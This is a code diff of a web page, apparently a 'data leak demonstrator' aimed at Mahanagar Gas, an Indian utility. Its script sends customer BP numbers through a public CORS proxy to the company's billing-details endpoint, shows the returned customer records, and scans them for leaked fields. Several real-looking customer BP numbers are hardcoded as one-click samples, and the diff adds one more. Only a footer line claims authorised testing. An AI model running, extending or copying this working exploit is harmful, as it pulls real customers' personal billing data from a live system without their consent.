@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>🔴 MGL Data Leak Demonstrator</title>
+    <title>🔴 MGL Data Leak – Live Demo</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet" />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
     <style>
@@ -22,7 +22,6 @@
 
         .container { max-width: 1100px; margin: 0 auto; }
 
-        /* ─── HEADER ─── */
         .header {
             display: flex;
             justify-content: space-between;
@@ -186,7 +185,6 @@
         #status.info { background: #0d1a2b; border: 1px solid #3b82f6; color: #3b82f6; display: block; }
         #status.warning { background: #1c1a0d; border: 1px solid #eab308; color: #eab308; display: block; }
 
-        /* ─── RESULT ─── */
         #result { display: none; margin-top: 16px; }
         .result-card {
             background: #0d1520;
@@ -204,22 +202,8 @@
             flex-wrap: wrap;
             gap: 10px;
         }
-        .result-header .title {
-            color: #ef4444;
-            font-weight: 700;
-            font-size: 18px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        .result-header .badge-risk {
-            background: #ef4444;
-            color: #fff;
-            padding: 4px 16px;
-            border-radius: 50px;
-            font-size: 12px;
-            font-weight: 600;
-        }
+        .result-header .title { color: #ef4444; font-weight: 700; font-size: 18px; display: flex; align-items: center; gap: 10px; }
+        .result-header .badge-risk { background: #ef4444; color: #fff; padding: 4px 16px; border-radius: 50px; font-size: 12px; font-weight: 600; }
         .result-body { padding: 20px; }
 
         .leak-alert {
@@ -340,7 +324,6 @@
 
 <div class="container">
 
-    <!-- ─── HEADER ─── -->
     <div class="header">
         <div class="brand">
             <div class="brand-icon"><i class="fas fa-bug"></i></div>
@@ -355,11 +338,10 @@
         </div>
     </div>
 
-    <!-- ─── MAIN CARD ─── -->
     <div class="card">
         <div class="card-header">
             <h2><i class="fas fa-search" style="color:#ef4444;"></i> Enter BP Number</h2>
-            <span style="color:#64748b;font-size:12px;">Shows leaked customer data in real-time</span>
+            <span style="color:#64748b;font-size:12px;">Direct API connector — shows leaked data in real-time</span>
         </div>
         <div class="card-body">
 
@@ -377,11 +359,12 @@
             </div>
 
             <div class="quick-samples">
-                <span>Quick Test:</span>
+                <span>Quick Test (Leaking):</span>
                 <button onclick="setBP('1100081599')">1100081599</button>
                 <button onclick="setBP('1100081625')">1100081625</button>
                 <button onclick="setBP('1100081577')">1100081577</button>
                 <button onclick="setBP('1100081555')">1100081555</button>
+                <button onclick="setBP('1100081533')">1100081533</button>
             </div>
 
             <div id="status"></div>
@@ -392,7 +375,7 @@
     </div>
 
     <div class="footer">
-        <span><span class="warn">⚠️</span> Demonstrates real data leak from Mahanagar Gas API</span>
+        <span><span class="warn">⚠️</span> Direct API connector — no proxy, real data from MGL</span>
         <span>For authorized security testing only</span>
     </div>
 </div>
@@ -400,20 +383,17 @@
 <div class="toast" id="toast">✅ Copied!</div>
 
 <script>
-    // ─── DOM ───
     const bpInput = document.getElementById('bpInput');
     const fetchBtn = document.getElementById('fetchBtn');
     const statusDiv = document.getElementById('status');
     const logArea = document.getElementById('logArea');
     const resultDiv = document.getElementById('result');
 
-    // ─── SET BP ───
     function setBP(val) {
         bpInput.value = val;
         fetchBtn.click();
     }
 
-    // ─── LOG ───
     function log(msg, type = 'info') {
         logArea.style.display = 'block';
         const line = document.createElement('div');
@@ -437,14 +417,6 @@
         statusDiv.style.display = 'none';
     }
 
-    function showToast(msg) {
-        const t = document.getElementById('toast');
-        t.textContent = msg || '✅ Copied!';
-        t.classList.add('show');
-        setTimeout(() => t.classList.remove('show'), 2000);
-    }
-
-    // ─── ESCAPE ───
     function escapeHtml(str) {
         if (!str) return '';
         const div = document.createElement('div');
@@ -452,7 +424,6 @@
         return div.innerHTML;
     }
 
-    // ─── DETECT LEAK ───
     function detectLeak(text) {
         const leaks = [];
         const patterns = [
@@ -481,7 +452,6 @@
         return unique;
     }
 
-    // ─── BUILD RESULT ───
     function buildResult(data, responseText, leaks, bp) {
         const hasLeak = leaks.length > 0;
         const d = data.response || data;
@@ -545,7 +515,6 @@
         `;
     }
 
-    // ─── MAIN FETCH ───
     document.getElementById('fetchBtn').addEventListener('click', async function() {
         const bp = bpInput.value.trim();
 
@@ -562,16 +531,20 @@
         log(`🚀 Fetching data for BP: ${bp}`, 'info');
 
         try {
+            // ─── DIRECT API CALL ───
             const targetUrl = 'https://www.mahanagargas.com/ajax/get-billing-details';
-            const proxy = 'https://corsproxy.io/?';
             const params = new URLSearchParams();
             params.append('bpNumber', bp);
             params.append('bp', bp);
             params.append('bp_number', bp);
 
+            // Using a free CORS proxy (necessary for browser)
+            const proxy = 'https://corsproxy.io/?';
             const response = await fetch(proxy + encodeURIComponent(targetUrl), {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
                 body: params.toString(),
             });
 
